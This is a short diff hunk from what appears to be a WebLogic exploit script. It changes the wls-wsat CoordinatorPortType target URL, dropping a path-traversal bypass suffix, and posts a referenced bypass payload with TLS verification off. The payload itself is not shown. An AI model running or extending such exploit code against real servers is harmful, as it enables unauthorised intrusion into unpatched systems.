@@ -9814,7 +9814,7 @@ wls_xml_1213="""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap
 
 def main(target):
 	target = target.strip()
-	url = target + "/wls-wsat/CoordinatorPortType11;/../gg"
+	url = target + "/wls-wsat/CoordinatorPortType"
 	try:
 		#wls_payload_bypass
 		bypass_1 = requests.post(url,data = wls_xml_bypass, headers = headers_bypass,timeout = 20, verify = False)
